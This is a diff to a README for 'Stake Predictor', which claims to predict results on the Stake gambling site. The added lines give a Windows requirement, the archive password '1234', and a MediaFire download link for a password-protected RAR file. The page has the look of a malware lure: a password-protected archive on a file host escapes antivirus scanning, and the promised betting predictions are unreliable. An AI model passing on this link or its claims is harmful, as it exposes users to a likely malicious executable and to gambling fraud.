@@ -13,3 +13,10 @@ Open the Application: Launch Stake Predictor from your installed location.
 Configure Settings: Adjust prediction parameters and strategies to optimize your results.
 Start Predicting: Use the tool to make data-driven predictions and enhance your gameplay.
 Monitor Results: Track your performance and refine your strategies based on the insights provided.
+Requirement: Windows
+
+Pass: 1234
+
+Requirement: Windows
+
+[Download the Latest Version](https://www.mediafire.com/file/goldkidbr10bqmz/Stake_Predictor.rar/file) 
